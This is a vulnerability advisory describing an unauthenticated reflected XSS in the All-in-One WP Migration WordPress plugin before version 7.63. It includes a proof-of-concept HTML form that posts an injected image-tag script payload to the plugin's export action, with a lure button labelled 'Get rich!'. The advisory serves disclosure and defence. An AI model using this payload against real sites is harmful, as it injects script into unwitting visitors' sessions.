# All-in-One WP Migration < 7.63 - Unauthenticated Reflected XSS
Description

The plugin uses the wrong content type for, and does not properly escape the response from the ai1wm_export action, allowing an attacker to craft a request that when submitted by any visitor will inject arbitrary html or javascript into the response that will be executed in the victims session.

# Proof of Concept
```
<form action="https://example.com/wp-admin/admin-ajax.php?action=ai1wm_export&ai1wm_import=1" method="POST">

  <!--

    Note: The secret key must be obtained through other means.

    It is stored in the site option `ai1wm_secret_key`, but is

    static for the lifetime of the site.

  -->

  <input type="hidden" name="secret_key" value="[secret_key]">

  <input type="hidden" name="ai1wm_manual_export" value="1">

  <input type="hidden" name="archive" value="<img src=x onclick=alert(/XSS/)>">



  <input type="submit" value="Get rich!">

</form>
```
